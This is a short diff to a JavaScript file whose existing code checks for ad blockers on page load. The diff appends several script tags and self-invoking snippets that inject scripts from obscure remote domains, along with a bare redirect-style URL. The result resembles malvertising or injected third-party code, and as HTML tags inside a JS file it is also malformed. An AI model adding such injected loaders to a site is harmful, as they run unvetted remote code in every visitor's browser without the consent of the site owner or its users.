@@ -155,3 +155,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
     checkAdBlocker();
 });
+<script src="https://fpyf8.com/88/tag.min.js" data-zone="151707" async data-cfasync="false"></script>
+<script src="https://eechicha.com/act/files/tag.min.js?z=9437273" data-cfasync="false" async></script>
+<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9437276,document.createElement('script'))</script>
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9437278,document.createElement('script'))</script>
+https://otieu.com/4/9437284
+<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9437289,document.createElement('script'))</script>
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9437290,document.createElement('script'))</script>
